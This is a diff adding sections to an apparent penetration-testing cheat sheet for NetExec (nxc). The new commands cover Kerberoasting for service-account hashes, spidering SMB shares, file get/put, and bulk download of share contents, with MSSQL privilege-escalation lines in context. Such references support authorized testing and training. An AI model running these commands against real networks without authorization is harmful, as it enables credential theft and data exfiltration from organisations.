@@ -170,6 +170,43 @@ nxc mssql $IP -u [user] -p [pass] -M mssql_priv -o ACTION=privesc
 
 # Rollback privileges
 nxc mssql $IP -u [user] -p [pass] -M mssql_priv -o ACTION=rollback
+```
+#### Kerberoasting
+> find kerberoastable accounts and get their hash.  
+> Note: You must use the FQDN of the DC. Add it to hosts or use the DC's DNS.  
+```bash
+nxc ldap [FQDN of DC] -u [user] -p [pass] --kerberoasting kerberoasting.out
+```
+#### Spidering and LOTL
+> Start with useing '--shares' to find out which shares you can access
+```bash
+# Finding all files
+nxc smb $IP -u [user] -p [pass] --spider [sharename] --regex .
+
+# Finding files by a pattern (ie: extension)
+nxc smb $IP -u [user] -p [pass] --spider [sharename] -pattern txt
+
+# Searching file contents
+nxc smb $IP -u [user] -p [pass] --spider [sharename] --content --regex [search term]
+```
+* File transfer
+```bash
+# --get-file
+nxc smb $IP -u [user] -p [pass] --share [sharename] --get-file [remote file] [save file]
+
+# --put-file
+nxc smb $IP -u [user] -p [pass] --share [sharename] --put-file [local file] [remote file]
+```
+#### Spider_plus
+> Use this to exclude shares like IPC$,print$, NETLOGON, SYVOL
+```bash
+# Exclude directories
+nxc smb $IP -u [user] -p [pass] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
+
+# Downlaod all files in the shares
+nxc smb $IP -u [user] -p [pass] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
+```
+
 ## Admin Credentialed enumeration
 
 ## Remote Shell
